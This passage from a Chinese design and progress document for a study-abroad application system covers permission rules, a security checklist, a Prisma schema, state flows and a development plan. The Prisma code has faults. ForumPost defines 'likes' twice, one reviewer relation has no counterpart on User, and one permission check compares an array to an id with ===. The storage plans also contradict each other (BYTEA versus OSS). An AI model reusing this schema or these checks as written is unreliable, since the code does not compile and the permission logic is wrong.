| `DELETE /api/posts/:id` | `post.author_id === user.id`（作者）或 `user.role === 'admin'` |
| `PUT /api/posts/:id` | `post.author_id === user.id`（作者） |
| `DELETE /api/school-promo/:id` | `promo.school_id === user.managed_schools`（学校管理员） |

#### 5.9.7 安全检查清单

开发阶段必须逐项验证：

- [ ] **评价权限**：后端必须校验学生是否真正完成了该校申请
- [ ] **评价唯一性**：数据库唯一索引 + 业务逻辑双重校验
- [ ] **高频操作**：点赞/浏览使用 Redis 缓存，避免数据库行锁
- [ ] **XSS 防护**：所有 UGC 内容必须经过 DOMPurify 清洗
- [ ] **软删除**：ForumPost/PostComment 使用 `is_deleted` 标记
- [ ] **用户删除**：删除用户时保留帖子内容，快照化作者信息
- [ ] **行级权限**：所有管理操作必须校验 `managed_schools` 或 `author_id`
- [ ] **越权防护**：管理员无法操作其他学校的数据
- [ ] **图片上传**：校验文件类型(MIME)和大小(≤5MB)，防止恶意文件
- [ ] **视频上传**：校验文件类型和大小(≤100MB)，仅管理员可上传
- [ ] **YouTube嵌入**：仅允许youtube.com/embed/域名，禁用javascript:协议
- [ ] **媒体存储**：使用独立域名或路径隔离用户上传的媒体文件

## 六、数据库设计

### 6.1 核心表结构（Prisma Schema）

```prisma
model User {
  id            String   @id @default(uuid())
  username      String   @unique
  password      String
  role          Role
  email         String?
  phone         String?
  school_id     String?  // 学校管理员关联的学校
  managed_schools String[] // 批复人员负责的学校列表
  created_at    DateTime @default(now())
  updated_at    DateTime @updatedAt

  applications    Application[]
  reviews         Review[]
  approvals       Approval[]
  // 论坛相关
  forumPosts       ForumPost[]
  postComments     PostComment[]
  postLikes        PostLike[]
  schoolReviews    SchoolReview[]
  schoolPosts      SchoolPost[] // 学校发布的宣传
  // 媒体文件
  uploadedMedia    Media[]
}

enum Role {
  student
  reviewer
  approver
  school_admin
  analyst
  admin
}

model School {
  id          String   @id @default(uuid())
  name        String
  country     String
  city        String
  logo        String?
  description String?
  is_deleted  Boolean  @default(false)  // 软删除标记
  created_at  DateTime @default(now())
  updated_at  DateTime @updatedAt

  majors          Major[]
  schoolReviews   SchoolReview[]
  forumPosts      ForumPost[]     // 关联到学校的论坛帖
  schoolPosts     SchoolPost[]    // 学校发布的宣传
}

model Major {
  id          String   @id @default(uuid())
  school_id   String
  name        String
  quota       Int      // 名额总数
  enrolled    Int      @default(0) // 已占用
  tuition     Decimal
  requirements String?
  created_at  DateTime @default(now())
  updated_at  DateTime @updatedAt

  school      School   @relation(fields: [school_id], references: [id])
  applications Application[]
}

model Application {
  id            String   @id @default(uuid())
  student_id    String
  major_id      String
  status        ApplicationStatus
  reviewer_id   String?  // 当前负责审查的人员
  applied_at    DateTime?
  reviewed_at   DateTime?
  approved_at   DateTime?
  deadline      DateTime? // 材料补充截止时间
  created_at    DateTime @default(now())
  updated_at    DateTime @updatedAt

  student       User     @relation(fields: [student_id], references: [id])
  major         Major    @relation(fields: [major_id], references: [id])
  reviewer      User?    @relation("ReviewerApplications", fields: [reviewer_id], references: [id])
  reviews       Review[]
  approvals     Approval[]
  documents     Document[]
}

enum ApplicationStatus {
  draft
  submitted
  pending_supplement // 待补充材料
  approved
  completed
  rejected
  expired // 逾期未补
}

model Review {
  id            String   @id @default(uuid())
  application_id String
  reviewer_id   String
  action        ReviewAction
  comment       String?
  created_at    DateTime @default(now())

  application   Application @relation(fields: [application_id], references: [id])
  reviewer      User   @relation(fields: [reviewer_id], references: [id])
}

enum ReviewAction {
  request_resubmit
  approve
  reject
}

model Approval {
  id            String   @id @default(uuid())
  application_id String
  approver_id   String
  notes         String?
  created_at    DateTime @default(now())

  application   Application @relation(fields: [application_id], references: [id])
  approver      User   @relation(fields: [approver_id], references: [id])
}

model Document {
  id            String   @id @default(uuid())
  application_id String
  name          String
  url           String   // OSS URL
  size          Int
  mime_type     String
  status        DocumentStatus
  created_at    DateTime @default(now())
  updated_at    DateTime @updatedAt

  application   Application @relation(fields: [application_id], references: [id])
}

enum DocumentStatus {
  uploading
  uploaded
  invalid_format
  approved
  rejected
}

// ============================================================================
// 校际评价与论坛模块
// ============================================================================

model SchoolReview {
  id          String   @id @default(uuid())
  school_id   String
  user_id     String
  rating      Int      // 1-5 评分
  title       String?  // 评价标题
  content     String   // 评价内容
  pros        String?  // 优点
  cons        String?  // 缺点
  status      ReviewStatus @default(pending) // 待审核/已发布/已隐藏
  is_deleted  Boolean  @default(false)  // 软删除标记
  created_at  DateTime @default(now())
  updated_at  DateTime @updatedAt

  school      School   @relation(fields: [school_id], references: [id])
  user        User     @relation(fields: [user_id], references: [id])

  @@unique([school_id, user_id]) // 每个学生只能评价一次
  @@map("school_reviews")
}

enum ReviewStatus {
  pending   // 待审核
  published // 已发布
  hidden    // 已隐藏
}

model ForumPost {
  id          String   @id @default(uuid())
  school_id   String?  // 可选：关联到特定学校
  author_id   String
  author_name String?  // 作者快照，避免删除用户后显示异常
  title       String
  content     String   // 支持富文本
  category    PostCategory
  views       Int      @default(0)
  likes       Int      @default(0)
  is_pinned   Boolean  @default(false)  // 置顶
  is_featured Boolean  @default(false)  // 精华
  is_deleted  Boolean  @default(false)  // 软删除标记
  status      PostStatus @default(published)
  created_at  DateTime @default(now())
  updated_at  DateTime @updatedAt

  school      School?  @relation(fields: [school_id], references: [id])
  author      User     @relation(fields: [author_id], references: [id])
  comments    PostComment[]
  likes       PostLike[]

  @@map("forum_posts")
}

enum PostCategory {
  general     // 综合讨论
  application // 申请经验
  visa        // 签证相关
  life        // 生活分享
  school      // 学校相关
  job         // 就业求职
}

enum PostStatus {
  draft
  published
  hidden
  deleted
}

model PostComment {
  id          String   @id @default(uuid())
  post_id     String
  author_id   String
  author_name String?  // 作者快照
  parent_id   String?  // 回复的评论ID（支持嵌套）
  content     String
  is_deleted  Boolean  @default(false)  // 软删除标记
  status      CommentStatus @default(published)
  created_at  DateTime @default(now())
  updated_at  DateTime @updatedAt

  post        ForumPost @relation(fields: [post_id], references: [id])
  author      User     @relation(fields: [author_id], references: [id])
  parent      PostComment? @relation("CommentReplies", fields: [parent_id], references: [id])
  replies     PostComment[] @relation("CommentReplies")

  @@map("post_comments")
}

enum CommentStatus {
  published
  hidden
  deleted
}

model PostLike {
  id          String   @id @default(uuid())
  post_id     String
  user_id     String
  created_at  DateTime @default(now())

  post        ForumPost @relation(fields: [post_id], references: [id], onDelete: Cascade)
  user        User     @relation(fields: [user_id], references: [id])

  @@unique([post_id, user_id])
  @@map("post_likes")
}

model SchoolPost {
  id          String   @id @default(uuid())
  school_id   String
  author_id   String
  author_name String?  // 作者快照
  title       String
  content     String
  type        SchoolPostType
  status      SchoolPostStatus @default(published)
  is_deleted  Boolean  @default(false)  // 软删除标记
  created_at  DateTime @default(now())
  updated_at  DateTime @updatedAt

  school      School   @relation(fields: [school_id], references: [id])
  author      User     @relation(fields: [author_id], references: [id])

  @@map("school_posts")
}

enum SchoolPostType {
  announcement // 公告
  news         // 新闻
  admission    // 招生信息
  faq          // 常见问题
  event        // 活动
  video_intro  // 学校视频介绍(支持富文本+视频/YouTube)
}

enum SchoolPostStatus {
  draft
  published
  hidden
}

model Media {
  id          String   @id @default(uuid())
  uploader_id String
  filename    String
  original_name String
  mime_type   String
  size        Int      // 字节
  url         String   // 存储路径或OSS URL
  media_type  MediaType
  status      MediaStatus @default(processing) // 处理中/就绪/失败
  created_at  DateTime @default(now())
  updated_at  DateTime @updatedAt

  uploader    User     @relation(fields: [uploader_id], references: [id])

  @@map("media")
}

enum MediaType {
  image
  video
  youtube
}

enum MediaStatus {
  processing // 处理中（如视频转码）
  ready      // 就绪
  failed     // 失败
  deleted    // 已删除
}
```

### 6.2 状态流转

| 当前状态 | 可执行操作 | 目标状态 |
|----------|------------|----------|
| draft | submit | submitted |
| submitted | request_resubmit | pending_supplement |
| submitted | approve | approved |
| submitted | reject | rejected |
| pending_supplement | resubmit | submitted |
| pending_supplement | expire | expired |
| approved | approve | completed |

## 七、技术风险与解决方案

| 风险点 | 解决方案 |
|--------|----------|
| 业务流程缺乏回流机制 | 增加"待补充材料"状态，支持材料不全/格式错误退回 |
| 大文件上传性能瓶颈 | 使用 PostgreSQL BYTEA 存储，简化架构 |
| 行级权限越权漏洞 | 后端强制校验每条查询的school_id/reviewer_id |
| 高并发审批 | 引入消息队列，异步处理 |
| 数据一致性 | 使用事务确保状态流转原子性 |
| 复杂统计报表 | 预计算+定期刷新统计指标 |
| 权限安全 | JWT认证+细粒度权限控制 |
| SQL维护成本爆炸 | 使用Prisma ORM，类型安全，可维护性强 |

## 八、项目结构

```
留学管理/
├── frontend/              # 前端项目 (React + Vite)
│   ├── src/
│   │   ├── components/     # 公共组件
│   │   │   └── ui/        # UI组件 (Button, Input, Select, Card, Modal)
│   │   ├── pages/          # 页面组件
│   │   ├── services/       # API服务
│   │   ├── stores/         # 状态管理 (Zustand)
│   │   ├── hooks/          # 自定义Hooks
│   │   ├── utils/          # 工具函数
│   │   └── types/          # TypeScript类型
│   ├── vite.config.ts
│   └── package.json
│
├── backend/               # 后端项目 (Node.js + Express)
│   ├── src/
│   │   ├── controllers/    # 控制器
│   │   ├── services/       # 业务逻辑
│   │   ├── routes/         # 路由
│   │   ├── middleware/     # 中间件（认证、权限、日志）
│   │   ├── utils/          # 工具函数
│   │   └── types/          # 类型定义
│   ├── prisma/
│   │   └── schema.prisma   # Prisma数据模型
│   └── package.json
│
└── database/
    └── migrations/         # 数据库迁移脚本
```

## 九、开发周期估算

| 阶段 | 时间 | 说明 |
|------|------|------|
| 需求分析 | 2-3周 | 详细梳理业务流程，确认功能需求 |
| 架构设计 | 2-3周 | 技术选型，数据库设计，接口设计 |
| 核心模块开发 | 10-12周 | 用户权限、申请流程（含回流）、文件上传、行级权限 |
| 辅助模块开发 | 4-6周 | 统计分析、系统管理等辅助功能 |
| 测试与优化 | 3-4周 | 功能测试、性能优化、Bug修复 |

**总计：约5-7个月**

## 十、方案可行性

**评估结果：可行** ✅

改进点：
1. ✅ 技术栈升级为 React+Vite+Prisma，开发体验更好
2. ✅ 业务流程增加回流机制，用户体验大幅提升
3. ✅ 文件直传OSS，避免后端带宽瓶颈
4. ✅ 后端强制行级权限校验，杜绝越权漏洞
5. ✅ Prisma ORM降低SQL维护成本

理由：
1. 技术选型成熟，社区资源丰富
2. 业务流程清晰，易于模块化开发
3. 角色权限明确，便于逐步迭代
4. 适合中小规模团队开发维护

## 十一、开发进度跟踪

### 2026-04-10 项目初始化

#### 已完成 ✅

**后端 (Node.js + Express + Prisma)**
- [x] Git 仓库初始化
- [x] 项目框架搭建
- [x] 数据库 Schema 设计
- [x] JWT 认证服务
- [x] RBAC 权限控制 (含行级权限)
- [x] 申请管理 CRUD + 审核流程
- [x] 学校管理 API
- [x] 专业管理 API
- [x] 用户管理 API
- [x] bcrypt 密码加密

**前端 (React + Vite + TypeScript)**
- [x] 项目框架搭建
- [x] Tailwind CSS 配置
- [x] UI 组件库
  - [x] Button
  - [x] Input
  - [x] Select
  - [x] Card
  - [x] Modal
- [x] Zustand 状态管理
- [x] 登录页面 (支持注册)
- [x] 仪表盘 (角色专属视图)
- [x] 申请列表页
- [x] 申请详情页
- [x] 申请创建页
- [x] 学校管理页
- [x] 数据分析页
- [x] 用户管理页
- [x] 系统设置页
- [x] 侧边栏用户菜单
- [x] 审查工作台页面
- [x] 批复工作台页面

#### 待开发 🔨

| 模块 | 功能 | 优先级 | 状态 |
|------|------|--------|------|
| 审查工作台 | /review 独立页面 | 高 | ✅ 已完成 |
| 批复工作台 | /approval 独立页面 | 高 | ✅ 已完成 |
| 材料上传 | 学生上传申请材料 (数据库) | 中 | ✅ 已完成 |
| 专业管理 | 学校专业增删改查 | 中 | ✅ 已完成 |
| 材料补充 | 学生补充材料流程 | 中 | ✅ 已完成 |
| 自动过期 | 逾期申请自动驳回 | 低 | ⏳ 待开发 |
| 审计日志 | 操作记录追踪 | 低 | ⏳ 待开发 |
| 数据导出 | 报表导出功能 | 低 | ⏳ 待开发 |

### 校际评价与论坛模块开发计划

| 阶段 | 内容 | 优先级 | 状态 |
|------|------|--------|------|
| **Phase 1** | **数据库设计** | - | ✅ 已完成 |
| 1.1 | 扩展 User/School 模型关系 | 高 | ✅ |
| 1.2 | SchoolReview 学校评价模型 | 高 | ✅ |
| 1.3 | ForumPost/PostComment 论坛模型 | 高 | ✅ |
| 1.4 | PostLike 点赞模型 | 高 | ✅ |
| 1.5 | SchoolPost 学校宣传模型 | 高 | ✅ |
| **Phase 2** | **后端 API 开发** | - | ✅ 已完成 |
| 2.1 | 学校评价 CRUD API | 高 | ✅ |
| 2.2 | 评价统计 API | 高 | ✅ |
| 2.3 | 论坛帖子 CRUD API | 高 | ✅ |
| 2.4 | 帖子点赞/浏览 API | 高 | ✅ |
| 2.5 | 评论功能 API | 中 | ✅ |
| 2.6 | 学校宣传 CRUD API | 高 | ✅ |
| 2.7 | 内容审核 API | 中 | ✅ |
| **Phase 3** | **前端页面开发** | - | ✅ 已完成 |
| 3.1 | 论坛首页 /forum | 高 | ✅ |
| 3.2 | 帖子详情页 /post/:id | 高 | ✅ |
| 3.3 | 创建帖子页 /create-post | 高 | ✅ |
| 3.4 | 学校评价页 /school-reviews | 高 | ✅ |
| 3.5 | 学校详情页 /school/:id (集成评价/宣传) | 高 | ✅ |
| 3.6 | 我的帖子页 /my-posts | 中 | ✅ |
| 3.7 | 学校宣传管理页 (学校管理员) | 中 | ✅ |
| 3.8 | 内容审核管理页 (系统管理员) | 中 | ✅ |
| **Phase 4** | **高级功能** | - | ⏳ 待开发 |
| 4.1 | 精华/置顶功能 | 低 | ⏳ |
| 4.2 | @消息通知 | 低 | ⏳ |
| 4.3 | 富文本编辑器集成 | 中 | ✅ |
| 4.4 | 搜索和分类过滤 | 中 | ✅ |

### 已完成文件清单

**后端 Controller 文件：**
- `backend/src/controllers/reviewController.ts` - 学校评价 CRUD
- `backend/src/controllers/forumController.ts` - 论坛帖子 CRUD
- `backend/src/controllers/schoolPostController.ts` - 学校宣传 CRUD
- `backend/src/controllers/mediaController.ts` - 媒体文件上传

**后端 Service 文件：**
- `backend/src/services/reviewService.ts` - 评价业务逻辑
- `backend/src/services/forumService.ts` - 论坛业务逻辑
- `backend/src/services/schoolPostService.ts` - 宣传业务逻辑
- `backend/src/services/mediaService.ts` - 媒体业务逻辑

**前端页面：**
- `frontend/src/pages/ForumPage.tsx` - 论坛首页
- `frontend/src/pages/PostDetailPage.tsx` - 帖子详情
- `frontend/src/pages/CreatePostPage.tsx` - 创建帖子
- `frontend/src/pages/SchoolReviewsPage.tsx` - 学校评价页
- `frontend/src/pages/SchoolDetailPage.tsx` - 学校详情
- `frontend/src/pages/MyPostsPage.tsx` - 我的帖子
- `frontend/src/pages/SchoolPosts.tsx` - 学校宣传管理

**前端组件：**
- `frontend/src/components/RichTextEditor.tsx` - 富文本编辑器
- `frontend/src/components/SchoolReviews.tsx` - 学校评价组件
- `frontend/src/components/ForumPostCard.tsx` - 帖子卡片
- `frontend/src/components/PostComments.tsx` - 评论组件

**前端 Service：**
- `frontend/src/services/reviewService.ts` - 评价 API 服务
- `frontend/src/services/forumService.ts` - 论坛 API 服务
- `frontend/src/services/schoolPostService.ts` - 宣传 API 服务

**数据库 Prisma 模型扩展：**
- `SchoolReview` - 学校评价模型
- `ForumPost` - 论坛帖子模型
- `PostComment` - 帖子评论模型
- `PostLike` - 帖子点赞模型
- `SchoolPost` - 学校宣传模型
- `Media` - 媒体文件模型

### Git 分支策略

```
main          # 主分支 (生产环境)
├── develop   # 开发分支
├── feature/* # 功能分支
└── fix/*     # Bug修复分支
```

### 部署说明

| 环境 | 地址 | 说明 |
|------|------|------|
| 开发环境 | localhost:3000 (后端) / localhost:5173 (前端) | 本地开发 |
| 测试环境 | - | 待配置 |
| 生产环境 | - | 待配置 |
